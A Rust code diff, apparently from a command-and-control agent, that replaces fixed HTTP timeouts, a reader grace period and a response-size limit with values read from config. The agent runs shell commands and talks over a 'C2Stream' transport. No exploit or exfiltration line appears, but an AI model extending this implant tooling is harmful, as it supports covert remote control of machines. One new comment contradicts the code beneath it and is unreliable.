@@ -35,14 +35,21 @@ fn spawn_shell(cmd: &str) -> std::io::Result<std::process::Child> {
 
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use crate::transport::C2Stream;
+use crate::config::config;
 
 /// Read timeout for individual HTTP read operations (30 seconds).
-const HTTP_READ_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30);
+/// No typed-config key exists for the per-read timeout - intentionally fixed.
+fn http_read_timeout() -> std::time::Duration {
+    std::time::Duration::from_secs(crate::config::config().agent.http_read_timeout_secs)
+}
 
-/// Overall deadline for the entire HTTP response (headers + body).
+/// Overall deadline for the entire HTTP response (headers + body), derived
+/// from agent.request_timeout_secs (default 120 s).
 /// A Slowloris server that sends 1 byte every 29 seconds would reset
 /// the per-read timeout indefinitely. This absolute deadline catches it.
-const HTTP_TOTAL_DEADLINE: std::time::Duration = std::time::Duration::from_secs(120);
+fn http_total_deadline() -> std::time::Duration {
+    std::time::Duration::from_secs(config().agent.request_timeout_secs)
+}
 
 // Guard fs import so it is only used on Linux (prevents warning on Windows)
 #[cfg(target_os = "linux")]
@@ -168,22 +175,24 @@ pub fn execute_shell_command_timeout(cmd: &str, timeout: std::time::Duration) ->
 
     // Grace period for reader threads after child exits. If a grandchild
     // holds the pipe open, we don't wait forever - take what we have.
-    const READER_GRACE: std::time::Duration = std::time::Duration::from_secs(1);
+    fn reader_grace() -> std::time::Duration {
+        std::time::Duration::from_secs(crate::config::config().agent.http_reader_grace_secs)
+    }
 
     let start = std::time::Instant::now();
     loop {
         match child.try_wait() {
             Ok(Some(status)) => {
-                let stdout = stdout_rx.recv_timeout(READER_GRACE).unwrap_or_default();
-                let stderr = stderr_rx.recv_timeout(READER_GRACE).unwrap_or_default();
+                let stdout = stdout_rx.recv_timeout(reader_grace()).unwrap_or_default();
+                let stderr = stderr_rx.recv_timeout(reader_grace()).unwrap_or_default();
                 return (stdout.trim().to_string(), stderr.trim().to_string(), status.code().unwrap_or(-1));
             }
             Ok(None) => {
                 if start.elapsed() > timeout {
                     let _ = child.kill();
                     let _ = child.wait();
-                    let stdout = stdout_rx.recv_timeout(READER_GRACE).unwrap_or_default();
-                    let stderr = stderr_rx.recv_timeout(READER_GRACE).unwrap_or_default();
+                    let stdout = stdout_rx.recv_timeout(reader_grace()).unwrap_or_default();
+                    let stderr = stderr_rx.recv_timeout(reader_grace()).unwrap_or_default();
                     let mut combined = stdout.trim().to_string();
                     if !combined.is_empty() { combined.push_str("\n\n"); }
                     combined.push_str(&format!(
@@ -336,7 +345,7 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
     // Per-read timeouts prevent hangs from dropped connections. An overall
     // deadline prevents Slowloris attacks where a tarpitting server sends
     // 1 byte every 29 seconds, resetting the per-read timeout indefinitely.
-    let deadline = tokio::time::Instant::now() + HTTP_TOTAL_DEADLINE;
+    let deadline = tokio::time::Instant::now() + http_total_deadline();
     let mut recv_buf = Vec::with_capacity(4096);
     let mut tmp = [0u8; 1024];
     let header_end: usize;
@@ -347,7 +356,7 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
             return Err("HTTP response exceeded total deadline".to_string());
         }
         // Use the sooner of per-read timeout and overall deadline
-        let read_deadline = deadline.min(tokio::time::Instant::now() + HTTP_READ_TIMEOUT);
+        let read_deadline = deadline.min(tokio::time::Instant::now() + http_read_timeout());
         match tokio::time::timeout_at(read_deadline, stream.read(&mut tmp)).await {
             Ok(Ok(0)) => return Err("EOF reading headers".to_string()),
             Ok(Ok(n)) => {
@@ -385,7 +394,7 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
             trimmed.starts_with("transfer-encoding:") && trimmed.contains("chunked")
         });
 
-    const MAX_RESPONSE: usize = 10 * 1024 * 1024; // 10 MB hard limit
+    fn max_response() -> usize { crate::config::config().agent.http_max_response_bytes as usize }
 
     if is_chunked {
         // Chunked transfer decoding with O(N) buffer management.
@@ -400,13 +409,13 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
             // Ensure we have a full chunk-size line from cursor onward
             while !chunk_buf[cursor..].windows(2).any(|w| w == b"\r\n") {
                 let mut tmp2 = [0u8; 512];
-                match tokio::time::timeout(HTTP_READ_TIMEOUT, stream.read(&mut tmp2)).await {
+                match tokio::time::timeout(http_read_timeout(), stream.read(&mut tmp2)).await {
                     Ok(Ok(0)) => return Ok(decoded_body),
                     Ok(Ok(n)) => chunk_buf.extend_from_slice(&tmp2[..n]),
                     Ok(Err(e)) => return Err(format!("Read chunk size: {}", e)),
                     Err(_) => return Err("Timeout reading chunk size".to_string()),
                 }
-                if chunk_buf.len() - cursor > MAX_RESPONSE { return Err("Chunk buffer overflow".into()); }
+                if chunk_buf.len() - cursor > max_response() { return Err("Chunk buffer overflow".into()); }
             }
 
             let crlf_pos = match chunk_buf[cursor..].windows(2).position(|w| w == b"\r\n") {
@@ -422,17 +431,17 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
                 Err(_) => return Err(format!("Malformed chunk size: '{}'", size_str)),
             };
             if chunk_size == 0 { break; }
-            if chunk_size > MAX_RESPONSE {
+            if chunk_size > max_response() {
                 return Err(format!("Single chunk size {} exceeds limit", chunk_size));
             }
-            if decoded_body.len().checked_add(chunk_size).unwrap_or(usize::MAX) > MAX_RESPONSE {
-                return Err(format!("Chunked response exceeds {} bytes", MAX_RESPONSE));
+            if decoded_body.len().checked_add(chunk_size).unwrap_or(usize::MAX) > max_response() {
+                return Err(format!("Chunked response exceeds {} bytes", max_response()));
             }
 
             let need = chunk_size + 2; // data + \r\n
             while chunk_buf.len() - cursor < need {
                 let mut tmp2 = [0u8; 4096];
-                match tokio::time::timeout(HTTP_READ_TIMEOUT, stream.read(&mut tmp2)).await {
+                match tokio::time::timeout(http_read_timeout(), stream.read(&mut tmp2)).await {
                     Ok(Ok(0)) => return Err("EOF in chunk data".into()),
                     Ok(Ok(n)) => chunk_buf.extend_from_slice(&tmp2[..n]),
                     Ok(Err(e)) => return Err(format!("Read chunk: {}", e)),
@@ -453,13 +462,13 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
     }
 
     if let Some(len) = content_len {
-        if len > MAX_RESPONSE {
+        if len > max_response() {
             return Err(format!("Response too large: {} bytes", len));
         }
         // body already has preamble bytes; read the rest
         while body.len() < len {
             let mut tmp2 = [0u8; 4096];
-            match tokio::time::timeout(HTTP_READ_TIMEOUT, stream.read(&mut tmp2)).await {
+            match tokio::time::timeout(http_read_timeout(), stream.read(&mut tmp2)).await {
                 Ok(Ok(0)) => break,
                 Ok(Ok(n)) => body.extend_from_slice(&tmp2[..n]),
                 Ok(Err(e)) => return Err(format!("Read body failed: {}", e)),
@@ -472,11 +481,11 @@ pub async fn manual_http_post(stream: &mut C2Stream, host: &str, path: &str, dat
         // No Content-Length and not chunked - read until EOF with a size limit
         loop {
             let mut tmp2 = [0u8; 4096];
-            match tokio::time::timeout(HTTP_READ_TIMEOUT, stream.read(&mut tmp2)).await {
+            match tokio::time::timeout(http_read_timeout(), stream.read(&mut tmp2)).await {
                 Ok(Ok(0)) => break,
                 Ok(Ok(n)) => {
-                    if body.len() + n > MAX_RESPONSE {
-                        return Err(format!("Response exceeds {} byte limit (no Content-Length)", MAX_RESPONSE));
+                    if body.len() + n > max_response() {
+                        return Err(format!("Response exceeds {} byte limit (no Content-Length)", max_response()));
                     }
                     body.extend_from_slice(&tmp2[..n]);
                 }
